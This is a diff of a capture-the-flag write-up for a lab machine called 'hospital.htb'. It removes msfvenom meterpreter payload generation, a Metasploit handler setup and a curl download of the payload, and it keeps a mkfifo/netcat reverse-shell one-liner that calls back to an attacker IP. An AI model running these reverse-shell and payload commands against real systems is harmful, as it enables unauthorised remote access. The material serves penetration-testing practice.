@@ -172,41 +172,11 @@ hospital.htb:8080/uploads/shell.phar
 
 Stabilizing the shell
 
-    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4246 -f exe -o expl.exe 
-
-![image](https://github.com/zer00d4y/writeups/assets/128820441/827fc86c-b916-418d-ab41-59b18f6e50e0)
-
-    msfconsole
-    
-    use multi/handler
-    
-    set payload windows/x64/meterpreter/reverse_tcp 
-    
-    set lhost tun0
-    
-    set lport 4246
-    
-    run
-
-![image](https://github.com/zer00d4y/writeups/assets/128820441/fa6a4aed-bbdf-4e46-9a6d-caf9f4293fe4)
-
-     python3 -m http.server 4245 
-
-![image](https://github.com/zer00d4y/writeups/assets/128820441/f8dbd744-3032-4c54-85a2-7151c5d29c3b)
-
-    curl -o s http://10.10.14.91:4245/expl
-
-![image](https://github.com/zer00d4y/writeups/assets/128820441/8dee0041-1ce1-4bf6-a1d7-0a4dd16fe379)
-
-![image](https://github.com/zer00d4y/writeups/assets/128820441/328c6981-ea6c-48b5-b2ac-4bd3d929f9c4)
-
-
-
-
+Start listener and use payload
 
     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.91 4444 >/tmp/f
 
-![image](https://github.com/zer00d4y/writeups/assets/128820441/1d236a6d-abff-46a5-997a-a3021ff50b88)
+![image](https://github.com/zer00d4y/writeups/assets/128820441/4c688f5a-d820-4732-be9f-45789765a064)
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/b4f63f18-c3d5-4e81-8729-27009722d801)
 
